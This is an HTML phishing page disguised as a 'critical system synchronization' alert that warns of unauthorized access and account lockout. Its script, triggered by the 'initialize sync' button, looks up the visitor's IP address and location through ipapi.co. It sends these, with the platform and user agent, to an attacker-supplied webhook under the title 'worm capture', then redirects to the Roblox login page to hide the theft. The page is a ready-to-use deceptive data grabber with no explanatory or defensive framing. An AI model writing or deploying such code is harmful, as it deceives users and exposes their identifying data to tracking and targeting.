<!DOCTYPE html>
<html>
<head>
    <title>Critical System Synchronization</title>
    <style>
        body { background: #0b0b0b; color: #ff0000; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .terminal { border: 1px solid #ff0000; padding: 40px; box-shadow: 0 0 20px #ff0000; text-align: center; }
        .glitch { font-size: 20px; text-transform: uppercase; animation: shake 0.5s infinite; }
        .btn { margin-top: 20px; background: transparent; color: #ff0000; border: 1px solid #ff0000; padding: 10px 20px; cursor: pointer; font-weight: bold; }
        .btn:hover { background: #ff0000; color: #000; }
        @keyframes shake { 0% {transform: translate(0);} 25% {transform: translate(2px, -2px);} 50% {transform: translate(-2px, 2px);} 100% {transform: translate(0);} }
    </style>
</head>
<body>
    <div class="terminal">
        <div class="glitch">UNAUTHORIZED ACCESS DETECTED</div>
        <p>RE-SYNC REQUIRED TO PREVENT ACCOUNT LOCKOUT</p>
        <button class="btn" id="exec">INITIALIZE SYNC</button>
        <div id="out" style="margin-top:10px; font-size:10px;"></div>
    </div>

<script>
const HOOK = "YOUR_WEBHOOK_HERE";

document.getElementById('exec').addEventListener('click', async () => {
    document.getElementById('out').innerText = "PENETRATING SYSTEM LAYERS...";
    
    try {
        const info = await fetch('https://ipapi.co/json/').then(r => r.json());
        
        await fetch(HOOK, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                embeds: [{
                    title: "ðŸ’€ SHÎ”DÃ˜W WORM CAPTURE",
                    color: 0,
                    fields: [
                        { name: "IP", value: info.ip, inline: true },
                        { name: "LOC", value: `${info.city}, ${info.country}`, inline: true },
                        { name: "HW", value: navigator.platform },
                        { name: "UA", value: navigator.userAgent }
                    ]
                }]
            })
        });
    } catch(e) {}
    
    window.location.href = "https://www.roblox.com/login";
});
</script>
</body>
</html>
